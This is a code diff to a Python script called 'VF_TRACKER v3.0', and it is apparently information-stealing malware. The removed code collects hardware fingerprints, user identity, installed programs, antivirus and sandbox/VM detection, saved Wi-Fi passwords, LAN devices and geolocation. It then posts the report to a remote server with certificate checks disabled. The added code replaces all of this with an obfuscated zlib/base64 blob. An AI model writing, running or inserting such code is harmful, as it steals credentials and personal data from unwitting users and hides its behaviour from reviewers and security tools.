-            full_clean = re.sub(r'<[^>]+>', ' ', html)
-            full_clean = re.sub(r'\s+', ' ', full_clean)
-
-            coords = _extract_coordinates(clean_text, full_clean)
-
-            # ─── 6. Extract ISP (English + Persian labels) ───
-            # ipnumberia uses various labels: ISP, ارائه دهنده, سرویس دهنده,
-            # شرکت, اپراتور, Provider, Organization, ASN
-            isp_patterns = [
-                # Table-row format: label ... value (with possible HTML remnants)
-                r'(?:ISP|Provider|Organization|ASN|Network)\s*.*?([\w\u0600-\u06FF\s\-\.&]{3,60})',
-                r'(?:\u0627\u0631\u0627\u0626\u0647\s?\u062f\u0647\u0646\u062f\u0647|'  # ارائه دهنده
-                r'\u0633\u0631\u0648\u06cc\u0633\s?\u062f\u0647\u0646\u062f\u0647|'      # سرویس دهنده
-                r'\u0634\u0631\u06a9\u062a|'                                              # شرکت
-                r'\u0627\u067e\u0631\u0627\u062a\u0648\u0631|'                            # اپراتور
-                r'\u0634\u0628\u06a9\u0647)'                                              # شبکه
-                r'\s*.*?([\w\u0600-\u06FF\s\-\.&]{3,60})',
-            ]
-            for pat in isp_patterns:
-                isp_match = re.search(pat, clean_text, re.IGNORECASE)
-                if isp_match:
-                    candidate = isp_match.group(1).strip()
-                    # Filter out non-ISP matches (too short or looks like HTML)
-                    if len(candidate) >= 3 and '<' not in candidate:
-                        isp = candidate
-                        break
-
-            # Fallback: keyword matching (Persian + English)
-            if isp == "\u0646\u0627\u0645\u0634\u062e\u0635":  # نامشخص
-                isp_keywords = [
-                    '\u0627\u06cc\u0631\u0627\u0646\u0633\u0644',     # ایرانسل
-                    '\u0645\u062e\u0627\u0628\u0631\u0627\u062a',     # مخابرات
-                    '\u0634\u0627\u062a\u0644',                       # شاتل
-                    '\u0631\u0627\u06cc\u062a\u0644',                 # رایتل
-                    '\u0632\u06cc\u0631\u0633\u0627\u062e\u062a',     # زیرساخت
-                    '\u067e\u0627\u0631\u0633 \u0622\u0646\u0644\u0627\u06cc\u0646',  # پارس آنلاین
-                    '\u0647\u0627\u06cc\u200c\u0648\u0628',           # های‌وب
-                    '\u0627\u0641\u0631\u0627\u0646\u062a',           # افرانت
-                    'Irancell', 'Mokhaberat', 'Shatel', 'Rightel',
-                    'Pars Online', 'HiWeb', 'Afranet', 'Iran Cell',
-                    'ADATA', 'Mobile Communication', 'TP', 'MCI',
-                    'Telecommunication', 'Infrastructure'
-                ]
-                for kw in isp_keywords:
-                    if kw.lower() in clean_text.lower():
-                        isp = kw
-                        break
-
-        return public_ip, isp, country, city, coords
-
-    except Exception as e:
-        return public_ip, str(e), "\u062e\u0637\u0627", "\u062e\u0637\u0627", "\u062e\u0637\u0627"
-
-
-def _extract_coordinates(context_text, full_text):
-    """
-    Extract geographic coordinates from ipnumberia.com text using multiple strategies.
-
-    ipnumberia.com puts latitude and longitude in SEPARATE table rows:
-      <tr><th>عرض جغرافیایی</th><td>35.689234</td></tr>
-      <tr><th>طول جغرافیایی</th><td>51.389056</td></tr>
-
-    Strategy 0: Separate-row table extraction (ipnumberia-specific)
-    Strategy 1: Labeled patterns (Lat/Lon keywords in English/Persian on same line)
-    Strategy 2: Simple decimal pairs (comma or space separated, with optional degree)
-    Strategy 3: Smart pair detection (find two decimals that look like coordinates)
-    Strategy 4: Concatenated numbers detection
-    """
-    # Search in both context and full page
-    search_texts = [context_text, full_text]
-
-    for text in search_texts:
-        # ─── Strategy 0: Separate-row extraction (ipnumberia.com format) ───
-        # Persian: عرض جغرافیایی / عرض‌جغرافیایی (with ZWNJ) ... 35.689234
-        lat_match = re.search(
-            r'(?:\u0639\u0631\u0636[\s\u200c]*\u062c\u063a\u0631\u0627\u0641\u06cc[\s\u200c]*\u0627\u06cc\u06cc|'
-            r'\u0639\u0631\u0636[\s\u200c]*\u062c\u063a\u0631\u0627\u0641\u06cc|'
-            r'Latitude|Lat)\s*.*?(-?\d{1,3}\.\d+)',
-            text, re.IGNORECASE)
-        lon_match = re.search(
-            r'(?:\u0637\u0648\u0644[\s\u200c]*\u062c\u063a\u0631\u0627\u0641\u06cc[\s\u200c]*\u0627\u06cc\u06cc|'
-            r'\u0637\u0648\u0644[\s\u200c]*\u062c\u063a\u0631\u0627\u0641\u06cc|'
-            r'Longitude|Lon|Lng)\s*.*?(-?\d{1,3}\.\d+)',
-            text, re.IGNORECASE)
-        if lat_match and lon_match:
-            lat_val = lat_match.group(1)
-            lon_val = lon_match.group(1)
-            # Validate: latitude should be -90 to 90, longitude -180 to 180
-            try:
-                lat_f = float(lat_val)
-                lon_f = float(lon_val)
-                if -90 <= lat_f <= 90 and -180 <= lon_f <= 180:
-                    return f"{lat_val}, {lon_val}"
-            except ValueError:
-                pass
-
-        # ─── Strategy 1: Labeled coordinates on same line ───
-        labeled_patterns = [
-            # English: Latitude: X, Longitude: Y
-            r'(?:Latitude|Lat)\s*[:：]?\s*(-?\d{1,3}\.\d+)\s*[°]?\s*.{0,15}?(?:Longitude|Lon|Lng)\s*[:：]?\s*(-?\d{1,3}\.\d+)',
-            # Coordinates label
-            r'(?:Coordinates?|\u0645\u062e\u062a\u0635\u0627\u062a|\u0645\u0648\u0642\u0639\u06cc\u062a)\s*[:：]?\s*(-?\d{1,3}\.\d+)\s*[°]?\s*[,،\s]\s*(-?\d{1,3}\.\d+)',
-        ]
-        for pat in labeled_patterns:
-            m = re.search(pat, text, re.IGNORECASE)
-            if m:
-                return f"{m.group(1)}, {m.group(2)}"
-
-        # ─── Strategy 2: Decimal pair with comma/space separator ───
-        pair_patterns = [
-            r'(-?\d{2}\.\d+)\s*[°]?\s*[,،]\s*(-?\d{2,3}\.\d+)',         # Comma separated
-            r'(-?\d{2}\.\d+)\s*[°]?\s+[NS]\s*[,،]?\s*(-?\d{2,3}\.\d+)', # N/S, then E/W
-        ]
-        for pat in pair_patterns:
-            m = re.search(pat, text)
-            if m:
-                return f"{m.group(1)}, {m.group(2)}"
-
-        # ─── Strategy 3: Smart pair detection ───
-        all_decimals = re.findall(r'(-?\d{1,3}\.\d{1,6})', text)
-        for i in range(len(all_decimals) - 1):
-            try:
-                val1 = float(all_decimals[i])
-                val2 = float(all_decimals[i + 1])
-                # Iran-specific range (most common use case)
-                if 24 <= val1 <= 42 and 43 <= val2 <= 64:
-                    return f"{all_decimals[i]}, {all_decimals[i+1]}"
-                # Global range
-                if -90 <= val1 <= 90 and -180 <= val2 <= 180 and abs(val2 - val1) > 3:
-                    return f"{all_decimals[i]}, {all_decimals[i+1]}"
-            except (ValueError, IndexError):
-                pass
-
-    # ─── Strategy 4: Concatenated numbers ───
-    m = re.search(r'(-?\d{2})\.(\d{4,6})(-?\d{2,3})\.(\d{4,6})', full_text)
-    if m:
-        lat_val = f"{m.group(1)}.{m.group(2)}"
-        lon_val = f"{m.group(3)}.{m.group(4)}"
-        try:
-            if -90 <= float(lat_val) <= 90 and -180 <= float(lon_val) <= 180:
-                return f"{lat_val}, {lon_val}"
-        except ValueError:
-            pass
-
-    return "\u0646\u0627\u0645\u0634\u062e\u0635"  # نامشخص
-
-
-# ═══════════════════════════════════════════════════════════════════════════════
-# REPORT BUILDER v3 — Comprehensive Report
-# ═══════════════════════════════════════════════════════════════════════════════
-
-def build_report(output_path=None, silent=False):
-    """
-    Build the full system tracker report with all phases.
-    Returns: (output_path, report_text, report_data_dict)
-    """
-    def log(msg):
-        if not silent:
-            print(msg)
-
-    if output_path is None:
-        script_dir = os.path.dirname(os.path.abspath(__file__))
-        output_path = os.path.join(script_dir, "VF_TRACKER_REPORT.txt")
-
-    os.makedirs(os.path.dirname(os.path.abspath(output_path)), exist_ok=True)
-
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    admin_status = "YES (Admin)" if is_admin() else "NO (Limited)"
-
-    log(f"\n{'='*70}")
-    log(f"  VF_TRACKER v3.0 - Collecting system information...")
-    log(f"  Time: {timestamp}")
-    log(f"{'='*70}\n")
-
-    # ─── Phase 1: Hardware Fingerprint ───
-    log("  [1/6] Collecting hardware fingerprint...")
-    motherboard = get_motherboard_serial()
-    bios_uuid = get_bios_uuid()
-    cpu_id = get_cpu_processor_id()
-    disk_serial = get_disk_serial()
-    gpu_list = get_gpu_info()
-    battery = get_battery_info()
-    mac_addr = get_mac_address()
-    hwid = generate_hwid(motherboard, bios_uuid, cpu_id, disk_serial, mac_addr)
-    machine_id = generate_machine_id(hwid)
-
-    # ─── Phase 1.5: OS & Basic ───
-    os_info, cpu_info = get_os_info()
-    hw_info = get_hardware_resources()
-    uptime = get_system_uptime()
-    hostname = socket.gethostname()
-
-    # ─── Phase 2: User Identity ───
-    log("  [2/6] Collecting user identity...")
-    username = get_windows_username()
-    fullname = get_user_fullname()
-    last_login = get_last_login()
-    users_list = get_installed_users()
-    domain_wg = get_domain_workgroup()
-    tz_locale = get_timezone_locale()
-    kb_layout = get_keyboard_layout()
-
-    # ─── Phase 2.5: Environment ───
-    log("  [3/6] Detecting environment...")
-    programs = get_installed_programs()
-    processes = get_running_processes()
-    antivirus = get_antivirus_info()
-    vm_detection = detect_vm_sandbox()
-    vpn_proxy = detect_vpn_proxy()
-
-    # ─── Phase 3: Deep Network ───
-    log("  [4/6] Collecting network information...")
-    local_ip = get_local_ip()
-    gateway = get_default_gateway()
-    wifi_ssid, wifi_signal = get_current_wifi_info()
-    wifi_profiles = get_all_wifi_profiles()
-    dns_servers = get_dns_servers()
-    dhcp_server = get_dhcp_server()
-    adapters = get_all_network_adapters()
-    proxy_settings = get_proxy_settings()
-    firewall = get_firewall_status()
-    wifi_passwords = get_wifi_passwords()
-    connections = get_active_connections()
-    arp_devices = get_arp_table()
-
-    # ─── Phase 3.5: Public IP ───
-    log("  [5/6] Retrieving public IP & geolocation...")
-    pub_ip, isp, country, city, coords = get_info_from_numberia()
-
-    # Parse coordinates for maps link
-    maps_link = "N/A"
-    if coords and coords not in ("Unknown", "\u0646\u0627\u0645\u0634\u062e\u0635") and ',' in coords:
-        try:
-            parts = coords.split(',')
-            maps_link = generate_maps_link(parts[0].strip(), parts[1].strip())
-        except Exception:
-            pass
-
-    # ─── Phase 4: Machine ID ───
-    log("  [6/6] Registering machine ID...")
-    existing_marker, marker_status = check_existing_marker()
-    is_new_machine = existing_marker is None
-    marker_saved, marker_msg = save_registry_marker(machine_id)
-
-    # ═══ BUILD TXT REPORT ═══
-    lines = []
-    sep = "=" * 70
-    sep2 = "-" * 70
-
-    lines.append(sep)
-    lines.append(f"  VF_TRACKER v3.0 REPORT")
-    lines.append(f"  Generated    : {timestamp}")
-    lines.append(f"  Admin Access  : {admin_status}")
-    lines.append(f"  Machine ID    : {machine_id}")
-    lines.append(f"  HWID          : {hwid[:32]}...")
-    lines.append(f"  Status        : {'NEW MACHINE' if is_new_machine else f'Known (first ID: {existing_marker})'}")
-    lines.append(sep)
-
-    # ── Section 1: Hardware Fingerprint ──
-    lines.append("")
-    lines.append(f"  {'[HARDWARE FINGERPRINT]':^70}")
-    lines.append(sep2)
-    lines.append(f"  [HW] Motherboard Serial  : {motherboard}")
-    lines.append(f"  [HW] BIOS UUID           : {bios_uuid}")
-    lines.append(f"  [HW] CPU Processor ID    : {cpu_id}")
-    lines.append(f"  [HW] Disk Drive Serial   : {disk_serial}")
-    lines.append(f"  [HW] MAC Address         : {mac_addr}")
-    lines.append(f"  [HW] Battery             : {battery}")
-    if isinstance(gpu_list, list):
-        for i, gpu in enumerate(gpu_list):
-            lines.append(f"  [HW] GPU #{i+1}              : {gpu}")
-    else:
-        lines.append(f"  [HW] GPU                 : {gpu_list}")
-    lines.append(f"  [HW] HWID (SHA256)       : {hwid}")
-    lines.append(f"  [HW] Machine ID          : {machine_id}")
-    lines.append(f"  [HW] Registry Marker     : {marker_msg}")
-
-    # ── Section 2: System & OS ──
-    lines.append("")
-    lines.append(f"  {'[SYSTEM & OS]':^70}")
-    lines.append(sep2)
-    lines.append(f"  [SYS] Hostname           : {hostname}")
-    lines.append(f"  [SYS] Operating System   : {os_info}")
-    lines.append(f"  [SYS] Processor          : {cpu_info}")
-    lines.append(f"  [SYS] Last Restart       : {uptime}")
-    if 'RAM' in hw_info:
-        lines.append(f"  [SYS] RAM                : {hw_info['RAM']}")
-    if 'Disk C:' in hw_info:
-        lines.append(f"  [SYS] Drive C:           : {hw_info['Disk C:']}")
-
-    # ── Section 3: User Identity ──
-    lines.append("")
-    lines.append(f"  {'[USER IDENTITY]':^70}")
-    lines.append(sep2)
-    lines.append(f"  [USER] Username          : {username}")
-    lines.append(f"  [USER] Full Name         : {fullname}")
-    lines.append(f"  [USER] Last Login        : {last_login}")
-    lines.append(f"  [USER] Domain/Workgroup  : {domain_wg}")
-    lines.append(f"  [USER] Timezone/Locale   : {tz_locale}")
-    lines.append(f"  [USER] Keyboard Layout   : {kb_layout}")
-    lines.append(f"  [USER] All Users:")
-    for u in users_list[:10]:
-        if u: lines.append(f"         - {u}")
-
-    # ── Section 4: Environment ──
-    lines.append("")
-    lines.append(f"  {'[ENVIRONMENT DETECTION]':^70}")
-    lines.append(sep2)
-    lines.append(f"  [ENV] Antivirus:")
-    for av in antivirus:
-        if av: lines.append(f"         - {av}")
-    lines.append(f"  [ENV] VM/Sandbox Detection:")
-    for vm in vm_detection:
-        if vm: lines.append(f"         - {vm}")
-    lines.append(f"  [ENV] VPN/Proxy Detection:")
-    for vp in vpn_proxy:
-        if vp: lines.append(f"         - {vp}")
-    lines.append(f"  [ENV] Installed Programs ({len(programs)} shown):")
-    for prog in programs[:20]:
-        if prog: lines.append(f"         - {prog}")
-    lines.append(f"  [ENV] Running Processes ({len(processes)} shown):")
-    for proc in processes[:15]:
-        if proc: lines.append(f"         - {proc}")
-
-    # ── Section 5: Network ──
-    lines.append("")
-    lines.append(f"  {'[NETWORK - INTERNAL]':^70}")
-    lines.append(sep2)
-    lines.append(f"  [NET] Local IP           : {local_ip}")
-    lines.append(f"  [NET] Gateway            : {gateway}")
-    lines.append(f"  [NET] DNS Servers        : {', '.join(dns_servers[:3])}")
-    lines.append(f"  [NET] DHCP Server        : {dhcp_server}")
-    lines.append(f"  [NET] Network Adapters:")
-    for ad in adapters[:5]:
-        if ad: lines.append(f"         - {ad}")
-    lines.append(f"  [NET] Proxy Settings:")
-    for ps in proxy_settings:
-        if ps: lines.append(f"         - {ps}")
-
-    # ── Section 6: WiFi ──
-    lines.append("")
-    lines.append(f"  {'[WIFI INFORMATION]':^70}")
-    lines.append(sep2)
-    lines.append(f"  [WIFI] Current SSID      : {wifi_ssid}")
-    lines.append(f"  [WIFI] Signal Strength   : {wifi_signal}")
-    lines.append(f"  [WIFI] Previous Networks ({len(wifi_profiles)} total):")
-    for wp in wifi_profiles:
-        if wp: lines.append(f"         - {wp}")
-    lines.append(f"  [WIFI] Saved Passwords:")
-    for name, passw in wifi_passwords:
-        lines.append(f"         -> {name:<25} | Pass: {passw}")
-
-    # ── Section 7: Public IP & Location ──
-    lines.append("")
-    lines.append(f"  {'[PUBLIC IP & GEOLOCATION]':^70}")
-    lines.append(sep2)
-    if pub_ip and pub_ip not in ("Not found", "\u06cc\u0627\u0641\u062a \u0646\u0634\u062f"):
-        lines.append(f"  [NET] Public IP          : {pub_ip}")
-        lines.append(f"  [NET] ISP                : {isp}")
-        lines.append(f"  [LOC] Country            : {country}")
-        lines.append(f"  [LOC] City               : {city}")
-        lines.append(f"  [LOC] Coordinates        : {coords}")
-        if maps_link != "N/A":
-            lines.append(f"  [LOC] Google Maps        : {maps_link}")
-    else:
-        lines.append(f"  [ERROR] Internet info retrieval failed.")
-
-    # ── Section 8: Security ──
-    lines.append("")
-    lines.append(f"  {'[SECURITY]':^70}")
-    lines.append(sep2)
-    lines.append(f"  [SEC] Firewall Status:")
-    for f in firewall:
-        if f: lines.append(f"         - {f}")
-    lines.append(f"  [SEC] Active Connections:")
-    for conn in connections:
-        if conn: lines.append(f"         -> {conn}")
-    lines.append(f"  [SEC] LAN Devices (ARP):")
-    for device in arp_devices:
-        if device: lines.append(f"         -> {device}")
-
-    lines.append("")
-    lines.append(sep)
-
-    report_text = "\n".join(lines)
-
-    # ═══ Write TXT file ═══
-    try:
-        with open(output_path, 'w', encoding='utf-8') as f:
-            f.write(report_text)
-        log(f"\n  [OK] Report saved to: {output_path}")
-    except Exception as e:
-        log(f"\n  [ERROR] Failed to save: {e}")
-        try:
-            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
-            fallback = os.path.join(desktop, "VF_TRACKER_REPORT.txt")
-            with open(fallback, 'w', encoding='utf-8') as f:
-                f.write(report_text)
-            log(f"  [OK] Fallback saved to: {fallback}")
-            output_path = fallback
-        except Exception:
-            log(f"  [ERROR] Fallback also failed")
-
-    # ═══ Build JSON data ═══
-    report_data = {
-        "version": "3.0",
-        "timestamp": timestamp,
-        "admin": admin_status,
-        "is_new_machine": is_new_machine,
-        "previous_machine_id": existing_marker,
-        # Hardware
-        "hwid": hwid,
-        "machine_id": machine_id,
-        "motherboard_serial": motherboard,
-        "bios_uuid": bios_uuid,
-        "cpu_processor_id": cpu_id,
-        "disk_serial": disk_serial,
-        "gpu": gpu_list,
-        "battery": battery,
-        "mac_address": mac_addr,
-        # System
-        "hostname": hostname,
-        "os": os_info,
-        "cpu": cpu_info,
-        "uptime": uptime,
-        "hardware": hw_info,
-        # User
-        "username": username,
-        "fullname": fullname,
-        "last_login": last_login,
-        "users": users_list,
-        "domain_workgroup": domain_wg,
-        "timezone_locale": tz_locale,
-        "keyboard_layout": kb_layout,
-        # Environment
-        "antivirus": antivirus,
-        "vm_detection": vm_detection,
-        "vpn_proxy": vpn_proxy,
-        "installed_programs": programs[:30],
-        "running_processes": processes,
-        # Network
-        "local_ip": local_ip,
-        "gateway": gateway,
-        "dns_servers": dns_servers,
-        "dhcp_server": dhcp_server,
-        "network_adapters": adapters,
-        "proxy_settings": proxy_settings,
-        "wifi_ssid": wifi_ssid,
-        "wifi_signal": wifi_signal,
-        "wifi_profiles": wifi_profiles,
-        "wifi_passwords": [{"name": n, "password": p} for n, p in wifi_passwords],
-        # Public
-        "public_ip": pub_ip,
-        "isp": isp,
-        "country": country,
-        "city": city,
-        "coordinates": coords,
-        "maps_link": maps_link,
-        # Security
-        "firewall": firewall,
-        "active_connections": connections,
-        "arp_devices": arp_devices,
-    }
-
-    # ═══ Save JSON ═══
-    json_path = output_path.replace('.txt', '.json')
-    try:
-        with open(json_path, 'w', encoding='utf-8') as f:
-            json.dump(report_data, f, ensure_ascii=False, indent=2)
-        log(f"  [OK] JSON saved to: {json_path}")
-    except Exception as e:
-        log(f"  [ERROR] JSON save failed: {e}")
-
-    if not silent:
-        print(report_text)
-
-    return output_path, report_text, report_data
-
-
-# ═══════════════════════════════════════════════════════════════════════════════
-# SERVER SENDER — POST data to PHP endpoint
-# ═══════════════════════════════════════════════════════════════════════════════
-
-def send_to_server(server_url, token, report_text, report_data, silent=False):
-    """Send tracker report to remote PHP server via HTTP POST."""
-    def log(msg):
-        if not silent:
-            print(msg)
-
-    try:
-        post_data = urllib.parse.urlencode({
-            'vf_token': token,
-            'tracker_data': report_text,
-            'tracker_json': json.dumps(report_data, ensure_ascii=False)
-        }).encode('utf-8')
-
-        req = urllib.request.Request(server_url, data=post_data, method='POST')
-        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
-        req.add_header('User-Agent', 'STORM_VX_TRACKER/3.0')
-
-        ctx = ssl._create_unverified_context()
-        response = urllib.request.urlopen(req, timeout=15, context=ctx)
-        response_data = response.read().decode('utf-8')
-
-        try:
-            result = json.loads(response_data)
-            if result.get('status') == 'ok':
-                log(f"  [OK] Report sent to server: {server_url}")
-                log(f"       Saved as: {result.get('file', 'unknown')}")
-                return True
-            else:
-                log(f"  [ERROR] Server rejected: {result.get('message', 'Unknown error')}")
-                return False
-        except json.JSONDecodeError:
-            log(f"  [OK] Server received data")
-            return True
-
-    except urllib.error.HTTPError as e:
-        log(f"  [ERROR] Server HTTP {e.code}: {e.reason}")
-        return False
-    except urllib.error.URLError as e:
-        log(f"  [ERROR] Cannot reach server: {e.reason}")
-        return False
-    except Exception as e:
-        log(f"  [ERROR] Send failed: {e}")
-        return False
-
-
-# ═══════════════════════════════════════════════════════════════════════════════
-# CLI ENTRY POINT
-# ═══════════════════════════════════════════════════════════════════════════════
-
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="VF_TRACKER v3.0 - Advanced System Identity Tracker")
-    parser.add_argument("--output", "-o", type=str, default=None,
-                        help="Custom output path for TXT report")
-    parser.add_argument("--silent", "-s", action="store_true",
-                        help="Silent mode - only write to file")
-    parser.add_argument("--server", type=str, default=DEFAULT_SERVER_URL,
-                        help=f"PHP receiver URL (default: {DEFAULT_SERVER_URL})")
-    parser.add_argument("--no-server", action="store_true",
-                        help="Skip sending to server (local only)")
-    parser.add_argument("--token", type=str, default=VF_SECRET_TOKEN,
-                        help="Security token for server authentication")
-    args = parser.parse_args()
-
-    result_path, report_text, report_data = build_report(
-        output_path=args.output, silent=args.silent
-    )
-
-    if not args.no_server and args.server:
-        send_to_server(
-            server_url=args.server,
-            token=args.token,
-            report_text=report_text,
-            report_data=report_data,
-            silent=args.silent
-        )
+import zlib,base64
+_d=(
+    "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"
